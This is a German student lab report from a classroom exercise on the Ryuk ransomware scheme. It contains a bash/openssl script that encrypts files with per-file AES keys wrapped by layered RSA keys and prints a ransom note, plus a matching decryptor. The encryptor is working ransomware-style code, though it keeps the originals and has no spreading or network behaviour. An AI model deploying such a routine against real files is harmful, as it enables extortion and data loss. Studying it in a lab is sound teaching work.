# Ryuk Red-Team

---
**Name:** Lukas Haselberger <br> David Weinberger <br>
**Klasse:** 5AHITS <br>
**Datum:** 05.10.2026 <br>
**Fach:** ITSE - Labor <br>


## Erstellen eines Bash-Skripts, das auf dem Ablauf von Ryuk basiert

**Aufgabenstellung:**

Red Team = Angreifer <br>
Erstelle ein bash Script das mehrere Dateinamen als Argumente akzeptiert und diese Dateien nach der von Ryuk angewendeten Strategie verschlüsselt. Verwende openssl


**Programm:**

```
#!/bin/bash
 
mkdir -p keys
 
echo "[+] Erzeuge globales RSA-2048-Schlüsselpaar..."

openssl genrsa -out keys/rsa_global_key_private.pem 2048

openssl rsa \

    -in keys/rsa_global_key_private.pem \

    -pubout \

    -out keys/rsa_global_key_public.pem
 
echo "[+] Erzeuge Victim-RSA-2048-Schlüsselpaar..."

openssl genrsa -out keys/rsa_victim_key_private.pem 2048

openssl rsa \

    -in keys/rsa_victim_key_private.pem \

    -pubout \

    -out keys/rsa_victim_key_public.pem
 
# AES-256-Schlüssel für den Victim-Key

echo "[+] Erzeuge aes_victim_key..."

openssl rand -hex 32 > keys/aes_victim_key
 
# AES-Key mit globalem RSA Public Key verschlüsseln

echo "[+] Verschlüssele aes_victim_key..."

openssl pkeyutl \

    -encrypt \

    -pubin \

    -inkey keys/rsa_global_key_public.pem \

    -in keys/aes_victim_key \

    -out keys/victim_key.enc
 
# Victim Private Key mit AES-256-CBC verschlüsseln

echo "[+] Verschlüssele rsa_victim_key_private.pem..."
 
openssl enc -aes-256-cbc \

    -e \

    -in keys/rsa_victim_key_private.pem \

    -out keys/victim_private.enc \

    -K "$(cat keys/aes_victim_key)" \

    -iv 00000000000000000000000000000000
 
rm keys/aes_victim_key
 
echo

echo "[+] Schlüssel wurden erzeugt."

echo

ls -lh keys

  
set -e
 
VICTIM_PUBLIC="keys/rsa_victim_key_public.pem"
 
if [ ! -f "$VICTIM_PUBLIC" ]; then

    echo "Fehler: $VICTIM_PUBLIC nicht gefunden."

    echo "Zuerst ./setup.sh ausführen."

    exit 1

fi
 
if [ "$#" -eq 0 ]; then

    echo "Verwendung:"

    echo "  $0 datei1 datei2 ..."

    echo

    echo "Beispiel:"

    echo "  $0 test1.txt test2.txt"

    exit 1

fi
 
for FILE in "$@"; do
 
    if [ ! -f "$FILE" ]; then

        echo "[!] Datei nicht gefunden: $FILE"

        continue

    fi
 
    OUT="${FILE}.enc"
 
    echo "[+] Verschlüssele: $FILE"
 
    # Zufälligen 256-Bit AES-Key erzeugen

    AES_KEY=$(openssl rand -hex 32)
 
    # Datei mit AES-256-CBC verschlüsseln

    openssl enc -aes-256-cbc \

        -e \

        -in "$FILE" \

        -out "$OUT.tmp" \

        -K "$AES_KEY" \

        -iv 00000000000000000000000000000000
 
    # Per-File-AES-Key mit RSA-2048 Public Key verschlüsseln

    printf "%s" "$AES_KEY" > "$OUT.key"
 
    openssl pkeyutl \

        -encrypt \

        -pubin \

        -inkey "$VICTIM_PUBLIC" \

        -in "$OUT.key" \

        -out "$OUT.rsa"
 
    rm "$OUT.key"
 
    # RSA-Ciphertext (256 Bytes) an AES-Ciphertext anhängen

    cat "$OUT.tmp" "$OUT.rsa" > "$OUT"
 
    rm "$OUT.tmp"

    rm "$OUT.rsa"
 
    echo "    -> $OUT"

done
 
echo

echo "=============================="

echo "       RANSOM NOTE"

echo "=============================="

echo

echo "Die angegebenen Testdateien wurden verschlüsselt."

echo "Die Originaldateien wurden für diese Schulübung"

echo "NICHT gelöscht."

echo

echo "Zum Entschlüsseln den Decryptor verwenden."

echo

 
```



## Entschlüsselungsprogramm erstellen und bei anderen ausprobieren (Blue Team)

**Aufgabenstellung:**

Lass einige deiner Files durch das Script eines anderen Mitschülers/Gruppe verschlüsseln. Versuche die Daten dann selbst wieder zu entschlüsseln – mit Hilfe des Master-Private-Keys (rsa_global_key_private) des anderen Schülers/der anderen Gruppe.
Implementiere den vollständigen Entschlüsselungsablauf als shell-script mit openssl


**Programm:**



#!/bin/bash
 
set -e
 
GLOBAL_PRIVATE="keys/rsa_global_key_private.pem"
VICTIM_PRIVATE_ENC="keys/victim_private.enc"
 
if [ ! -f "$GLOBAL_PRIVATE" ]; then
    echo "Fehler: Globaler Private Key fehlt."
    exit 1
fi
 
if [ ! -f "$VICTIM_PRIVATE_ENC" ]; then
    echo "Fehler: victim_private.enc fehlt."
    exit 1
fi
 
if [ "$#" -eq 0 ]; then
    echo "Verwendung:"
    echo "  $0 datei.enc"
    echo
    echo "Beispiel:"
    echo "  $0 test.txt.enc"
    exit 1
fi
 
echo "[+] Entschlüssele aes_victim_key..."
 
openssl pkeyutl \
    -decrypt \
    -inkey "$GLOBAL_PRIVATE" \
    -in keys/victim_key.enc \
    -out /tmp/aes_victim_key
 
echo "[+] Entschlüssele Victim Private Key..."
 
openssl enc -aes-256-cbc \
    -d \
    -in "$VICTIM_PRIVATE_ENC" \
    -out /tmp/rsa_victim_key_private.pem \
    -K "$(cat /tmp/aes_victim_key)" \
    -iv 00000000000000000000000000000000
 
for FILE in "$@"; do
 
    if [ ! -f "$FILE" ]; then
        echo "[!] Datei nicht gefunden: $FILE"
        continue
    fi
 
    SIZE=$(stat -c%s "$FILE")
 
    # RSA-2048 Ciphertext = 256 Bytes
    AES_SIZE=$((SIZE - 256))
 
    if [ "$AES_SIZE" -le 0 ]; then
        echo "[!] Keine gültige verschlüsselte Datei: $FILE"
        continue
    fi
 
    echo "[+] Entschlüssele: $FILE"
 
    # Die letzten 256 Bytes enthalten den RSA-verschlüsselten AES-Key
    dd if="$FILE" \
       of="/tmp/file.rsa" \
       bs=1 \
       skip="$AES_SIZE" \
       status=none
 
    # Alles davor ist AES-Ciphertext
    dd if="$FILE" \
       of="/tmp/file.aes" \
       bs=1 \
       count="$AES_SIZE" \
       status=none
 
    # AES-Key mit Victim Private Key entschlüsseln
    openssl pkeyutl \
        -decrypt \
        -inkey /tmp/rsa_victim_key_private.pem \
        -in /tmp/file.rsa \
        -out /tmp/file.key
 
    AES_KEY=$(cat /tmp/file.key)
 
    # Original wiederherstellen
    OUT="${FILE%.enc}"
 
    openssl enc -aes-256-cbc \
        -d \
        -in /tmp/file.aes \
        -out "$OUT" \
        -K "$AES_KEY" \
        -iv 00000000000000000000000000000000
 
    echo "    -> $OUT"
done
 
rm -f /tmp/aes_victim_key
rm -f /tmp/rsa_victim_key_private.pem
rm -f /tmp/file.rsa
rm -f /tmp/file.aes
rm -f /tmp/file.key
 
echo
echo "[+] Entschlüsselung abgeschlossen."


